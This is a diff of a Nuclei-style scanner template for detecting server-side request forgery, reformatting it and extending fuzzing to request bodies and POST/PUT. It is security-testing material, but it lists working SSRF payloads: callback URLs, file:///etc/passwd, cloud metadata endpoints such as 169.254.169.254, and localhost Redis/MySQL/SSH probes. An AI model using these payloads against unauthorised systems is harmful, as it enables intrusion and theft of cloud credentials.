@@ -1,5 +1,4 @@
 id: response-ssrf
-
 info:
   name: Full Response SSRF Detection
   author: pdteam,pwnhxl,j4vaovo,AmirHossein Raeisi
@@ -8,36 +7,11 @@ info:
     - https://github.com/bugcrowd/HUNT/blob/master/ZAP/scripts/passive/SSRF.py
   metadata:
     max-request: 12
-  tags: ssrf,dast,vuln
-
+  tags: dast,ssrf,vuln
 http:
-  - pre-condition:
-      - type: dsl
-        dsl:
-          - 'method == "GET"'
-
-    payloads:
-      ssrf:
-        - 'http://{{interactsh-url}}'
-        - 'http://{{FQDN}}.{{interactsh-url}}'
-        - 'http://{{FQDN}}@{{interactsh-url}}'
-        - 'http://{{interactsh-url}}#{{FQDN}}'
-        - 'http://{{RDN}}.{{interactsh-url}}'
-        - 'http://{{RDN}}@{{interactsh-url}}'
-        - 'http://{{interactsh-url}}#{{RDN}}'
-        - 'file:////./etc/./passwd'
-        - 'file:///c:/./windows/./win.ini'
-        - 'http://metadata.tencentyun.com/latest/meta-data/'
-        - 'http://100.100.100.200/latest/meta-data/'
-        - 'http://169.254.169.254/latest/meta-data/'
-        - 'http://169.254.169.254/metadata/v1'
-        - 'http://127.0.0.1:22'
-        - 'http://127.0.0.1:3306'
-        - 'dict://127.0.0.1:6379/info'
-
-    fuzzing:
-      - part: query
-        mode: single
+  - fuzzing:
+      - fuzz:
+          - '{{ssrf}}'
         keys:
           - callback
           - continue
@@ -69,67 +43,84 @@ http:
           - validate
           - view
           - window
-        fuzz:
-          - "{{ssrf}}"
-
-      - part: query
         mode: single
+        parts:
+          - query
+          - body
+      - fuzz:
+          - '{{ssrf}}'
+        mode: single
+        parts:
+          - query
+          - body
         values:
-          - "(https|http|file)(%3A%2F%2F|://)(.*?)"
-        fuzz:
-          - "{{ssrf}}"
-
-    stop-at-first-match: true
-    matchers-condition: or
+          - (https|http|file)(%3A%2F%2F|://)(.*?)
     matchers:
-
-      - type: word
-        part: body
+      - part: body
+        type: word
         words:
-          - "Interactsh Server"
-
-      - type: regex
-        part: body
+          - Interactsh Server
+      - part: body
         regex:
-          - 'SSH-(\d.\d)-OpenSSH_(\d.\d)'
-
-      - type: regex
-        part: body
+          - SSH-(\d.\d)-OpenSSH_(\d.\d)
+        type: regex
+      - part: body
         regex:
-          - '(DENIED Redis|CONFIG REWRITE|NOAUTH Authentication)'
-
-      - type: regex
-        part: body
+          - (DENIED Redis|CONFIG REWRITE|NOAUTH Authentication)
+        type: regex
+      - part: body
         regex:
-          - '(\d.\d.\d)(.*?)mysql_native_password'
-
-      - type: regex
-        part: body
+          - (\d.\d.\d)(.*?)mysql_native_password
+        type: regex
+      - part: body
         regex:
           - 'root:.*?:[0-9]*:[0-9]*:'
-
-      - type: word
-        part: body
+        type: regex
+      - part: body
+        type: word
         words:
-          - 'for 16-bit app support'
-
-      - type: regex
-        part: body
+          - for 16-bit app support
+      - part: body
         regex:
-          - 'dns-conf\/[\s\S]+instance\/'
-
-      - type: regex
-        part: body
+          - dns-conf\/[\s\S]+instance\/
+        type: regex
+      - part: body
         regex:
-          - 'app-id[\s\S]+placement\/'
-
-      - type: regex
-        part: body
+          - app-id[\s\S]+placement\/
+        type: regex
+      - part: body
         regex:
-          - 'ami-id[\s\S]+placement\/'
-
-      - type: regex
-        part: body
+          - ami-id[\s\S]+placement\/
+        type: regex
+      - part: body
         regex:
-          - 'id[\s\S]+interfaces\/'
+          - id[\s\S]+interfaces\/
+        # digest: 490a0046304402204b55b88881395115ce6ea6f288a4f3057f24fa3960272b2b44de0d62f1d81b67022002e37a5632b3861ddab6fcb0c4e57f15be028fddb01e142b24fda2f39405d7a0:922c64590222798bb761d5b6d8e72950
 
+        type: regex
+    matchers-condition: or
+    payloads:
+      ssrf:
+        - http://{{interactsh-url}}
+        - http://{{FQDN}}.{{interactsh-url}}
+        - http://{{FQDN}}@{{interactsh-url}}
+        - http://{{interactsh-url}}#{{FQDN}}
+        - http://{{RDN}}.{{interactsh-url}}
+        - http://{{RDN}}@{{interactsh-url}}
+        - http://{{interactsh-url}}#{{RDN}}
+        - file:////./etc/./passwd
+        - file:///c:/./windows/./win.ini
+        - http://metadata.tencentyun.com/latest/meta-data/
+        - http://100.100.100.200/latest/meta-data/
+        - http://169.254.169.254/latest/meta-data/
+        - http://169.254.169.254/metadata/v1
+        - http://127.0.0.1:22
+        - http://127.0.0.1:3306
+        - dict://127.0.0.1:6379/info
+    pre-condition:
+      - dsl:
+          - method == "GET"
+          - method == "POST"
+          - method == "PUT"
+        type: dsl
+    stop-at-first-match: true
